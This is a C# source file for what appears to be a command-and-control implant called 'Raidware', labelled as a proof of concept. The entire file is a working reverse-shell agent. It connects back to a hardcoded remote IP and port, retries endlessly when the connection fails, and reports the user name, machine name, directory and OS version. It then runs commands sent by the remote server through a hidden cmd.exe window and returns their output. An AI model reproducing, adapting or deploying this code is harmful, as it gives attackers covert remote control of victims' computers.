// This is a basic Proof-of-concept C# agent that will execute a command and return the output.

using System;
using System.Net.Sockets;
using System.Text;

namespace Raidware.Agent.TCP
{
    internal class main
    {

        const string IP = "192.168.43.110";
        const int PORT = 5555;

        const string DELIMITER = "|RAIDWARE-EoM|";
        const string BEGIN = "|RAIDWARE-SoM|";
        const int BUFFER_SIZE = 4096;

        public abstract class IRaidwareAgent
        {
            public string UID;

            protected void NewConnection(string host)
            {
                Console.WriteLine($"({UID}) -- New Connection Received -- {host}");
            }
            public abstract void Send(string msg);
            public abstract string Recv();
            public abstract void Close();
            public abstract void Connect();
        }

        public class TCPAgent : IRaidwareAgent
        {
            NetworkStream stream = null;
            TcpClient client;
            string ip;
            int port;

            byte[] buffer  = new byte[BUFFER_SIZE];

            public TCPAgent(string ip, int port)
            {
                this.ip = ip;
                this.port = port;
            }

            private string RecvBufferToString(byte[] buffer, int bytesRead)
            {
                string buf = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                Array.Clear(buffer, 0, buffer.Length);

                int begin = BEGIN.Length;
                int end = buf.IndexOf(DELIMITER);
                if (end == -1)
                {
                    throw new Exception("RaidwareAgent.TCP.BufferRecv");
                }
                var _buf = "";
                for(int i = begin + 1; i < end - 1; i++)
                {
                    _buf += buf[i];
                }
                return _buf;
            }
            private byte[] SendStringToBuffer(string msg)
            {
                msg = BEGIN + "{" + msg + "}" + DELIMITER;
                return Encoding.ASCII.GetBytes(msg);
            }

            public override void Close()
            {
                client.Close();
            }

            public override void Connect()
            {
                _RE:
                try
                {
                    client = new TcpClient(this.ip, this.port);
                }
                catch(System.Net.Sockets.SocketException)
                {
                    Console.Error.WriteLine("[-] Unable to connect to client. Sleeping for 5 seconds and trying again...");
                    System.Threading.Thread.Sleep(5000);
                    goto _RE;
                }

                this.stream = client.GetStream();
                
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                UID = RecvBufferToString(buffer, bytesRead);
                NewConnection($"{ip}:{port}");
            }

            public override string Recv()
            {
                try
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    return RecvBufferToString(buffer, bytesRead);
                }
                catch (System.IO.IOException)
                {
                    throw new Exception("Raidware.Agent.TCP.ForceClose");
                }
            }

            public override void Send(string msg)
            {
                byte[] buf = SendStringToBuffer(msg);
                try
                {
                    stream.Write(buf, 0, buf.Length);
                }
                catch(Exception)
                {
                    // Error Handling...
                }
            }
        }
        internal class Parser
        {

            System.Collections.Generic.List<string> ValidCommands = new System.Collections.Generic.List<string>()
            {
                "SHELL",
                "PUT",
                "GET"
            };

            private static string RunCommand(string cmd, string shell="cmd.exe")
            {
                try
                {
                    var cmds = cmd.Split(' ');
                    if (cmds[0] == "cd")
                    {
                        string[] exec = new string[cmds.Length - 1];
                        for (int i = 1; i < cmds.Length; i++)
                            exec[i - 1] = cmds[i];

                        System.IO.Directory.SetCurrentDirectory($@"{String.Join(" ", exec)}");
                        // return $@"Changed directory to ""{String.Join(" ", exec)}""";
                        return Environment.CurrentDirectory;
                    }
                }
                catch
                {
                    return "An Error occurred. Please be careful";
                }

                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.FileName = shell;
                startInfo.Arguments = "/c ";
                startInfo.Arguments += cmd;

                proc.StartInfo = startInfo;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                String output = proc.StandardOutput.ReadToEnd();
                output += proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                return output.TrimEnd('\r', '\n');
            }

            public static string Join(string[] msg, int begin = 1, int end = -1, char delimiter=' ')
            {
                string ret = "";
                if(end == -1)
                {
                    end = msg.Length - 1;
                }
                for (int i = begin; i <= end; i++)
                {
                    ret += msg[i];
                    if (i <= end - 1)
                    {
                        ret += delimiter;
                    }
                }
                return ret;
            }

            public static string Parse(string msg)
            {
                var msgs = msg.Split();

                if(msgs[0] == "RAIDWARE-INTERACT")
                {
                    return $"{Environment.UserName}|{Environment.MachineName}|{Environment.CurrentDirectory}";
                }
                else if(msgs[0] == "RAIDWARE-CMD")
                {
                    return Parser.RunCommand(
                        Join(
                            msg: msgs,
                            begin: 1,
                            end: -1,
                            delimiter: ' '
                        )
                    );
                }
                else if(msgs[0] == "RAIDWARE-INTERACT-END")
                {
                    return "END-ACK";
                }
                return "";
            }
        }


        public static void Listen()
        {
            //  This will just listen for any incoming commands and then simply parse them.
            while(true)
            {
                Console.WriteLine("Listening for incoming data");
                var data = tc.Recv();
                Console.WriteLine($"Data Received: {data}");
                var _ = Parser.Parse(data);
                Console.WriteLine($"Data being sent is: {_}");
                tc.Send(_);
            }
        }

        public static TCPAgent tc = null;

        public static void Main(string[] args)
        {
        _RE:
            try
            {
                tc = new TCPAgent(IP, PORT);
                tc.Connect();
                var send = $"RAIDWARE_INIT|{Environment.OSVersion}";
                Console.WriteLine($"Sending the following message: {send}");
                tc.Send(send);

                // Going into listening mode....
                Listen();
            }
            catch
            {
                Console.WriteLine("An Error occurred. Restarting after 5 seconds...");
                System.Threading.Thread.Sleep(5000);
                goto _RE;
            }


            tc.Close();
        }

    }
}
